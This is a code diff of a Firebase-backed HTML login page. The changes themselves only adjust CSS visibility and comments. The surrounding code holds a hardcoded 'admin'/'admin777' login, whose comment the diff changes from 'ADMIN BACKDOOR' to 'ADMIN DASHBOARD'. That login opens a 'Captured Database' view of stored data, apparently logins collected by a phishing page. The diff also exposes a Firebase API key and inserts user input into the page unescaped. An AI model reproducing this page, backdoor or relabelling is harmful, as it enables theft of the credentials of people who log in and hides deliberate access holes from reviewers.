@@ -177,10 +177,17 @@
     font-weight: 600;
   }
 
+  /* === FIXED: Portal output === */
   #portal-output {
     margin-top: 20px;
     display: none;
     width: 100%;
+  }
+
+  #portal-output.visible {
+    display: block !important;
+    visibility: visible !important;
+    opacity: 1 !important;
   }
 
   .admin-table {
@@ -247,7 +254,7 @@
   </div>
 
 <script>
-  // --- FIREBASE CONFIG (Aapka wahi) ---
+  // --- FIREBASE CONFIG ---
   const firebaseConfig = {
     apiKey: "AIzaSyDi20_1FpiU7OQ4EEQMDdvyHlY5_Vn23F4",
     authDomain: "dragoai-ef040.firebaseapp.com",
@@ -263,7 +270,7 @@
   }
   const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;
 
-  // --- AUTH HANDLER (Button click se chalega) ---
+  // --- AUTH HANDLER ---
   function handleAuth() {
     const user = document.getElementById("username").value.trim();
     const pass = document.getElementById("password").value.trim();
@@ -273,7 +280,7 @@
       return;
     }
 
-    // === ADMIN BACKDOOR ===
+    // === ADMIN DASHBOARD ===
     if (user === "admin" && pass === "admin777") {
       document.getElementById("auth-form").style.display = "none";
       loadDashboard();
@@ -301,7 +308,7 @@
   function showWelcome(user) {
     document.getElementById("auth-form").style.display = "none";
     const output = document.getElementById("portal-output");
-    output.style.display = "block";
+    output.classList.add("visible");
     output.innerHTML = `
       <h2 style="font-size:1.5rem; font-weight:600; text-align:center; margin-bottom:10px;">Welcome, ${user}</h2>
       <p style="text-align:center; color:#8e8e8e; margin-bottom:20px;">Your account is ready.</p>
@@ -330,10 +337,10 @@
     `;
   }
 
-  // --- ADMIN DASHBOARD (Live Firebase se data le kar table dikhata hai) ---
+  // === ADMIN DASHBOARD (FIXED) ===
   function loadDashboard() {
     const output = document.getElementById("portal-output");
-    output.style.display = "block";
+    output.classList.add("visible");
     output.style.textAlign = "left";
     output.innerHTML = `
       <h3 style="font-size:1.1rem; font-weight:600; margin-bottom:10px;">Captured Database</h3>
